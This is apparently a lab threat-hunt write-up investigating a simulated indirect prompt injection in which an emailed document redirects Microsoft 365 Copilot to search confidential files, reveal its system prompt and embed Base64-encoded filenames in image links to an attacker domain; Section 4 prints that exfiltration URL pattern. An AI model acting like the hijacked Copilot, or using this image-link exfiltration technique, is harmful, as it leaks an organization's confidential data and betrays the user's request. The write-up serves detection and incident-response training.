# Operation ECHOLEAK: Microsoft 365 Copilot Threat Hunt

A hands-on threat hunt investigating how a malicious document redirected Microsoft 365 Copilot from summarizing a report to accessing sensitive organizational files and generating external image links carrying encoded data.

**Analyst:** Cristian Severin  
**Environment:** The Cyber Range, simulated Microsoft 365 organization  
**Incident date:** September 20, 2026  
**Threat hunt completed:** October 20, 2026
**Workspace:** `LAW-HuntPractice`  
**RunId:** `el--17-20260920`

---

## Table of Contents

- [Scenario](#scenario)
- [Mission and Scope](#mission-and-scope)
- [Section 1: Email Delivery](#section-1-email-delivery)
- [Section 2: Copilot Session Hijack](#section-2-copilot-session-hijack)
- [Section 3: Sensitive File Collection](#section-3-sensitive-file-collection)
- [Section 4: Exfiltration Mechanism and Configuration Exposure](#section-4-exfiltration-mechanism-and-configuration-exposure)
- [Section 5: Normal vs. Anomalous Behavior](#section-5-normal-vs-anomalous-behavior)
- [Section 6: Expanded Collection and Impact](#section-6-expanded-collection-and-impact)
- [Investigation Timeline](#investigation-timeline)
- [Indicators and Investigation Pivots](#indicators-and-investigation-pivots)
- [Recommended Response](#recommended-response)
- [Lessons Learned](#lessons-learned)

---

## Scenario

Cormorant Capital Partners is a simulated financial advisory firm with approximately 200 employees using Microsoft 365 E5 and Copilot for Microsoft 365.

An analytics rule flagged unusual file access involving financial analyst Emily Chen. She accessed board materials, acquisition assessments, and salary information while using Copilot to summarize a quarterly report received by email.

The handoff reported no unusual sign-in activity. The investigation therefore focused on what happened inside the Copilot interaction and why its actions differed from Emily’s request.


---

## Mission and Scope

My objective was to reconstruct the chain from email delivery to Copilot activity, identify the affected information, and explain the apparent exfiltration mechanism and visibility limitations.

| Item | Scope |
|---|---|
| Time window | September 20, 2026, 09:00–11:00 UTC |
| Primary identity | `emily.chen@cormorantcapital.com` |
| Additional identity in handoff | `mark.ross@cormorantcapital.com` |
| Hunt filter | `RunId == "el--17-20260920"` |
| Anomalous session | `cp-emily-20261007-1042` |

### Evidence Sources

| Table | Purpose |
|---|---|
| `OfficeActivity_CL` | Email delivery and document-access events |
| `CopilotAudit_CL` | User prompts, Graph tool calls, searches, and generated responses |
| `EntraSignIn_CL` | Authentication context |

The supplied exports contained 68 Copilot records, 49 Office activity records, and two Entra sign-in records.

### Timestamp and Evidence Notes

- Timeline entries below use UTC. Exported CSV timestamps display Pacific time, seven hours behind UTC on the incident date.
- The supplied `OriginalTime` values were invalid, so the timeline uses `TimeGenerated` with that display conversion.
- The session identifier contains `20261007`, but the event timestamps and hunt scope place this activity on September 20. I treated it as an identifier, not a date.
- The handoff describes five files in six seconds. The exported initial file-access events actually span eight seconds, from 10:42:47 through 10:42:55 UTC.
- The handoff identifies the initial files as previously unopened. The two-hour exports alone cannot establish Emily’s complete historical access baseline.

---

## Section 1: Email Delivery

### Objective

Identify the external sender, the document, and the delay before Emily interacted with it.

### Findings

| Question | Finding |
|---|---|
| Sender | `quarterly.reports@globalfinancereview.net` |
| Attachment | `Q3-2026-Global-Markets-Review.docx` |
| Email delivery | 09:15:22 UTC |
| First document access | 10:42:08 UTC |
| Elapsed time | 86 minutes and 46 seconds, approximately 87 minutes |

The email presented the attachment as a routine quarterly market review. Emily later opened the document and invoked Copilot.

The delay supports a user-dependent sequence in this lab. Delivery alone did not immediately trigger the observed collection.

<img width="1277" height="664" alt="image" src="https://github.com/user-attachments/assets/d2861358-83c0-4094-8ad4-f2987e0e6310" />


### Supporting KQL

```kusto
let start_time = todatetime("2026-09-20T09:00:00.0000000Z");
OfficeActivity_CL
| where TimeGenerated > start_time
| order by TimeGenerated asc
| where RunId contains "el--17-20260920"
| where UserId contains "emily"
```
To identify which exact email was the phishing email, I ran a KQL query from what I already knew, which was the approximate time it happened, searching the OfficeActivity_CL table for all of Emily's emails. 

---

## Section 2: Copilot Session Hijack

### Objective

Compare Emily’s legitimate request with the actions Copilot performed.

### User Request

> Summarise the key findings of this quarterly report

The request appeared at **10:42:35 UTC**.

Within seconds, Copilot issued searches unrelated to summarizing the report:

- `board minutes confidential`
- `M&A acquisition target`
- `salary review confidential`

It then used `Graph.ReadFile` to read sensitive documents across multiple departments.

<img width="1290" height="593" alt="image" src="https://github.com/user-attachments/assets/61d61b02-3adb-41ea-bf49-1c14bebe3bcd" />


### Supporting KQL

```kusto
let start_time = todatetime("2026-09-20T09:00:00.0000000Z");
CopilotAudit_CL
| where TimeGenerated > start_time
| order by TimeGenerated asc
| where RunId contains "el--17-20260920"
| where UserId contains "emily"


```

<!-- Add screenshot: Original user prompt followed by unrelated Graph searches and file reads. -->

### Interpretation

The mismatch between the requested task and the subsequent actions supports the lab’s indirect prompt injection classification.

The document was the untrusted input. Copilot’s search and read capabilities became the means of collecting unrelated organizational information.

There was no shell or script execution in the supplied telemetry. Graph tool calls should not be described as operating-system command execution.

---

## Section 3: Sensitive File Collection

### Objective

Identify the initial documents accessed during the anomalous session.

### Initial Five Files

| Time, UTC | File | Logged Sensitivity |
|---|---|---|
| 10:42:47 | Board Meeting Minutes - October 2026.docx | Confidential |
| 10:42:49 | Project Falcon - M&A Target Assessment.xlsx | Confidential |
| 10:42:51 | Salary Review FY2027 - Executive Summary.pdf | Confidential |
| 10:42:53 | Client Portfolio - Henderson Family Office.xlsx | Confidential |
| 10:42:55 | Copilot System Configuration - Cormorant.json | Internal Only |

`CopilotAudit_CL` recorded the corresponding `Graph.ReadFile` calls. `OfficeActivity_CL` recorded successful access events for the same five files.

<img width="1118" height="275" alt="image" src="https://github.com/user-attachments/assets/6203c798-a341-43a5-9bff-f3cf42e7094c" />


### Supporting KQL - Same as in Section 2

```kusto
let start_time = todatetime("2026-09-20T09:00:00.0000000Z");
CopilotAudit_CL
| where TimeGenerated > start_time
| order by TimeGenerated asc
| where RunId contains "el--17-20260920"
| where UserId contains "emily"
```

### Why This Was Suspicious

The files covered executive decisions, acquisition targets, compensation, client holdings, and Copilot configuration. None was necessary to fulfill the visible quarterly-report summary request.

The sequence showed coordinated cross-department collection rather than ordinary document summarization.

---

## Section 4: Exfiltration Mechanism and Configuration Exposure

### Objective

Identify the external destination, explain the transfer mechanism, and determine what the logs can prove.

### Destination

`metrics-cdn[.]analyticshub[.]io`

The domain appeared inside the `CopilotResponse` field of response events in `CopilotAudit_CL`.

### Mechanism

Copilot generated Markdown image links using this structure:

```text
![Chart](hxxps://metrics-cdn[.]analyticshub[.]io/img?d=<Base64-value>&s=<marker>)
```

The image URL contained encoded information in the `d` query parameter.

When a renderer or image proxy requests that URL, the destination receives the query string. This creates a transfer path through what appears to be an image-loading operation.

The lab describes cloud-side fetching. If the fetch originates from cloud infrastructure, endpoint network monitoring may not show a direct connection from the user’s workstation to the external domain.

**Important distinction:** The supplied audit logs show the generated links. They do not include HTTP request logs proving that each link was fetched, or identifying the actual fetching system.

### What the Encoded Values Showed

Decoding the visible Base64 values produced document filenames and a configuration marker.

For example:

```text
c3lzdGVtX3Byb21wdF9jb3Jtb3JhbnRfY2FwaXRhbA==
```

Decoded to:

```text
system_prompt_cormorant_capital
```

These values demonstrate information embedded in the URLs. They do not reconstruct the full contents of the accessed documents.

### Supporting KQL - Same as Section 2

<img width="738" height="176" alt="image" src="https://github.com/user-attachments/assets/34577deb-9456-41ee-8089-219fdcbaf390" />


### CoSnitch: Configuration Exposure

At **10:44:19 UTC**, a response displayed a purported system prompt and enterprise configuration, including:

- Sensitivity labels and classification policy.
- A DLP policy setting.
- Permitted data sources.
- A stated access scope.
- Custom instructions and organizational structure.

This information could help an attacker tailor follow-on injections and identify valuable targets.

However, it was text in a generated response. The exports do not independently authenticate it as the actual tenant configuration or prove that the stated permissions were effective.

<img width="498" height="709" alt="image" src="https://github.com/user-attachments/assets/f2b50b18-4e31-4a90-a0a9-e97099cbcef2" />

### Exact Exfiltrated Content

**Not determined from available logs.**

The exports record file access, generated response text, and constructed URLs. They do not contain full source-document contents or outbound HTTP request/receipt evidence sufficient to determine the exact data successfully delivered externally.

---

## Section 5: Normal vs. Anomalous Behavior

### Objective

Determine whether the session could reasonably be explained as normal Copilot use.

### Comparison

| Normal Usage in the Export | Anomalous Session |
|---|---|
| Routine summaries, grammar checks, and document assistance | Searches for confidential board, acquisition, and salary material |
| References to ordinary Finance documents | Reads across Executive, HR, Finance, and IT |
| Ordinary text responses without the observed external image destination | Responses containing external image URLs with encoded values |
| No comparable configuration disclosure | Response displaying a system prompt and enterprise configuration |

<img width="1297" height="644" alt="image" src="https://github.com/user-attachments/assets/f67deac3-9a77-42a0-907c-7f761453c479" />

### Authentication Context

The supplied Entra export contained two successful sign-ins for Emily from the same recorded IP, with successful Conditional Access and Authenticator MFA.

Those two records did not show an obvious sign-in anomaly. They also did not prove the absence of account compromise or establish the token used for each Copilot action.

The investigation therefore relied on the interaction’s behavior, rather than treating successful authentication as proof of legitimate activity.

<img width="1302" height="467" alt="image" src="https://github.com/user-attachments/assets/4f259b25-2a16-40dd-9d1d-812795c9ef79" />


---

## Section 6: Expanded Collection and Impact

### Objective

Determine whether the activity stopped after the initial five files.

### SearchLeak Expansion

At **10:45:30 UTC**, the session began another round of searches using:

```text
confidential
restricted
board
acquisition
salary
```

Those searches were followed by reads of eight additional files:

1. Compliance Audit Results - H2 2026.xlsx
2. Restricted Client List - Internal Only.docx
3. Board Resolution - Emergency Session.pdf
4. Acquisition Pipeline - Q4 2026.xlsx
5. Executive Salary Benchmarking 2027.pdf
6. Confidential Investigation - Insider Trading.docx
7. Board Committee Minutes - Audit Committee.docx
8. Quarterly Revenue Report - Restricted Distribution.xlsx

At **10:46:35 UTC**, a response contained external image links with encoded names corresponding to these documents.


**Result:** 13 distinct target files, comprising the initial five and eight additional files. This excludes the quarterly report used as the delivery document.

<img width="494" height="517" alt="image" src="https://github.com/user-attachments/assets/4d9055cc-5bab-434b-9262-ea7170cd263f" />


### Impact Assessment

The activity potentially exposed board information, acquisition plans, compensation material, client portfolios, compliance information, and configuration details.

The evidence supports unauthorized task redirection and broad collection within Emily’s available context. It does not establish privilege escalation, confirmed receipt of every external request, or the full contents transferred.

### Incident Classification

**Indirect prompt injection through an externally supplied document, resulting in unrelated sensitive-file collection, configuration disclosure in the generated response, and an apparent image-URL exfiltration attempt.**

---

## Investigation Timeline

All times are September 20, 2026, UTC.

| Time | Event | Source |
|---|---|---|
| 09:15:22 | External email delivered with quarterly-report attachment | OfficeActivity_CL |
| 10:42:08 | Emily accessed the delivery document | OfficeActivity_CL |
| 10:42:35 | Emily requested a quarterly-report summary | CopilotAudit_CL |
| 10:42:41–10:42:45 | Copilot searched for board, acquisition, and salary information | CopilotAudit_CL |
| 10:42:47–10:42:55 | Initial five target files read | CopilotAudit_CL; OfficeActivity_CL |
| 10:43:08 | Response included four external image links with encoded filenames | CopilotAudit_CL |
| 10:44:15 | Another access to the configuration file recorded | OfficeActivity_CL |
| 10:44:19 | Configuration disclosure and external configuration link appeared | CopilotAudit_CL |
| 10:45:30–10:45:45 | Expanded keyword searches | CopilotAudit_CL |
| 10:45:46–10:46:26 | Eight additional Graph file-read calls | CopilotAudit_CL |
| 10:46:35 | Response included eight further external image links | CopilotAudit_CL |

The Graph-call and Office-access timestamps differ slightly for some additional files. I treated them as separate observations rather than forcing them into identical timestamps.

---

## Indicators and Investigation Pivots

| Type | Value | Relevance |
|---|---|---|
| Sender | `quarterly.reports@globalfinancereview[.]net` | Delivered the attachment |
| Delivery document | `Q3-2026-Global-Markets-Review.docx` | Document Emily asked Copilot to summarize |
| External destination | `metrics-cdn[.]analyticshub[.]io` | Embedded in generated image URLs |
| URL structure | `/img?d=<encoded-value>&s=<marker>` | Carries encoded information |
| Session | `cp-emily-20261007-1042` | Correlates the anomalous interaction |
| Collection tools | `Graph.SearchFiles`, `Graph.ReadFile` | Search and read activity |
| RunId | `el--17-20260920` | Scopes the lab dataset |

Graph tool names are legitimate capabilities, not malicious indicators by themselves. Their relevance comes from the task mismatch, target files, timing, and generated external links.

---

## Recommended Response

These are recommendations arising from the hunt, not actions demonstrated as completed.

1. **Preserve evidence and contain the document.** Retain the original message, attachment, interaction records, and audit logs. Quarantine the message and document through approved procedures.
2. **Investigate external delivery.** Seek image-proxy, cloud-service, secure web gateway, or destination-side evidence to determine whether the generated URLs were fetched.
3. **Hunt for recurrence.** Search for the sender, attachment, destination domain, and comparable response patterns across other users and sessions.
4. **Review access to sensitive repositories.** Check whether Emily’s access was necessary and whether SharePoint/OneDrive permissions exposed excessive sensitive material.
5. **Assess information exposure.** Validate any disclosed configuration against actual settings and involve relevant data owners to determine potential impact.
6. **Improve AI-specific monitoring.** Correlate external-document summarization with unrelated sensitive searches, rapid cross-department reads, and external links in generated responses.

Blocking the destination is one containment measure. Endpoint-only blocking may be insufficient if the actual fetch occurs through cloud infrastructure.

---

## Lessons Learned

- **A legitimate user request can precede malicious tool behavior.** The user’s visible prompt was ordinary; the deviation appeared in subsequent searches, reads, and responses.
- **Successful authentication does not establish legitimate intent.** The suspicious behavior occurred without an obvious anomaly in the supplied sign-in records.
- **Cloud audit and interaction logs complement each other.** Office activity showed access, while Copilot telemetry revealed the searches, tool calls, and generated links.
- **Encoded data is not the same as complete document contents.** The visible URL values decoded to filenames and a marker, limiting conclusions about actual data loss.
- **Validate the handoff against the evidence.** Timestamp differences, limited access history, and missing HTTP telemetry affected what could be stated confidently.

This hunt strengthened my experience with KQL, Microsoft 365 audit analysis, session correlation, indirect prompt injection investigations, and evidence-based reporting.
